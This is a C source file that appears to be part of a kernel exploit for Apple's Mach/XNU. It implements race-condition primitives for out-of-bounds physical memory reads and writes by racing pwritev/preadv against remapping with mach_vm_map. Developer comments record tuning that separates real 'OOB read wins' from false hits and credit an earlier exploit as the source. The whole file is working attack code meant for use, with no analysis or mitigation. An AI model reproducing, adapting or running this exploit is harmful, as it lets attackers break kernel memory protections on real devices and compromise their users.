// phys_oob.c
// V41: Complete rewrite with Q0/Q1 logging + OOB data dump

#include "phys_oob.h"

#include <string.h>
#include <sys/uio.h>
#include <unistd.h>

#include "surface.h"

void initialize_physical_read_write(mach_vm_size_t contiguous_mapping_size) {
    g_ctx.pc_size = contiguous_mapping_size;
    kern_return_t kr = create_physically_contiguous_mapping(&g_ctx.pc_object, &g_ctx.pc_address, g_ctx.pc_size);
    if (kr != KERN_SUCCESS) {
        LOG_ERR("create_physically_contiguous_mapping: %s (%d)", mach_error_string(kr), kr);
        return;
    }

    LOG("pc_object: %#x", g_ctx.pc_object);
    LOG("pc_address: %#llx", g_ctx.pc_address);

    memset_pattern8((void*)g_ctx.pc_address, &g_ctx.random_marker, g_ctx.pc_size);

    g_ctx.free_target = g_ctx.pc_address;
    g_ctx.free_target_size = g_ctx.pc_size;

    atomic_store_explicit(&g_ctx.shared->free_target_sync, g_ctx.free_target, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->free_target_size_sync, g_ctx.free_target_size, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->free_thread_start, 1, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->go_sync, 1, memory_order_seq_cst);
}

kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
    atomic_store_explicit(&g_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);

    g_ctx.iov.iov_base = (void*)(g_ctx.pc_address + 0x3f00);
    g_ctx.iov.iov_len = offset + size;

    memcpy(buffer, &g_ctx.random_marker, sizeof(uint64_t));
    memcpy((void*)(g_ctx.pc_address + 0x3f00 + offset), &g_ctx.random_marker, sizeof(uint64_t));

    bool read_race_succeeded = false;
    ssize_t w = 0;

    // V25: OG (ClearSwordCore cs2_oob_read) gates restored. The V41/V44 port
    // dropped the w==-1 gate and scanned the FULL window for non-marker words,
    // so our own marker backfill manufactured ~6000 "hits" with one unique Q0.
    // OG: only an EFAULT staging copy (w==-1) whose read-back differs from the
    // marker AT Q0 counts as an OOB read win.
    for (uint64_t try_idx = 0; try_idx < (g_ctx.highiest_success_idx + 100); try_idx++) {
        if ((try_idx & 0x3f) == 0 && cs_expired()) {
            LOG_ERR("physical_oob_read_mo: deadline hit, bailing");
            return KERN_FAILURE;
        }
        atomic_store_explicit(&g_ctx.shared->race_sync, 1, memory_order_seq_cst);
        w = pwritev(g_ctx.read_fd, &g_ctx.iov, 1, 0x3f00);
        while (atomic_load_explicit(&g_ctx.shared->race_sync, memory_order_seq_cst) == 1);

        mach_vm_address_t map_addr = g_ctx.pc_address;
        kern_return_t kr =
            mach_vm_map(mach_task_self(), &map_addr, g_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, g_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            LOG_ERR("physical_oob_read_mo: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
            return KERN_FAILURE;
        }

        if (w == -1) {
            pread(g_ctx.read_fd, buffer, size, 0x3f00 + offset);
            uint64_t marker = 0;
            memcpy(&marker, buffer, sizeof(marker));
            // V25.1: reject our own tag echo. After a mid-copy remap the
            // staging keeps reading through pc VA into the remapped search
            // object itself — whose pages are the v25 tags (0xC0DEC0DE|idx) —
            // so !=marker alone passed every self-read (the 12 logged a win
            // at every offset, no PCB). A real win = pool content that is
            // neither the marker NOR our own tags.
            if ((uint32_t)(marker >> 32) == 0xC0DEC0DEu) {
                usleep(1);
            }
            else if (marker != g_ctx.random_marker) {
                read_race_succeeded = true;
                g_ctx.success_read_count += 1;
                if (try_idx > g_ctx.highiest_success_idx) {
                    g_ctx.highiest_success_idx = try_idx;
                }
                break;
            }
            usleep(1);
        }

        if (try_idx == 500) break;
    }
    atomic_store_explicit(&g_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
    return read_race_succeeded ? KERN_SUCCESS : KERN_FAILURE;
}

void physical_oob_read_mo_with_retry(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint64_t oob_size, uint64_t oob_offset, uint8_t* read_buffer) {
    while (!cs_expired()) {
        kern_return_t kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        if (kr == KERN_SUCCESS) {
            break;
        }
    }
}

void physical_oob_write_mo(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
    atomic_store_explicit(&g_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);

    g_ctx.iov.iov_base = (void*)(g_ctx.pc_address + 0x3f00);
    g_ctx.iov.iov_len = offset + size;
    pwrite(g_ctx.write_fd, buffer, size, 0x3f00 + offset);

    for (uint64_t try_idx = 0; try_idx < 20; try_idx++) {
        if (cs_expired()) break;
        atomic_store_explicit(&g_ctx.shared->race_sync, 1, memory_order_seq_cst);
        preadv(g_ctx.write_fd, &g_ctx.iov, 1, 0x3f00);
        while (atomic_load_explicit(&g_ctx.shared->race_sync, memory_order_seq_cst) == 1);

        mach_vm_address_t map_addr = g_ctx.pc_address;
        kern_return_t kr =
            mach_vm_map(mach_task_self(), &map_addr, g_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, g_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            LOG_ERR("physical_oob_write_mo: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
            return;
        }
        usleep(1);
    }

    atomic_store_explicit(&g_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
}
